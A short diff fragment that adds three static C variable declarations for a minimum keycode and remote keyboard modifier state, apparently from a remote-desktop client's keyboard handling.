+ static int min_keycode;
+ static uint16 remote_modifier_state = 0;
+ static uint16 saved_remote_modifier_state = 0;
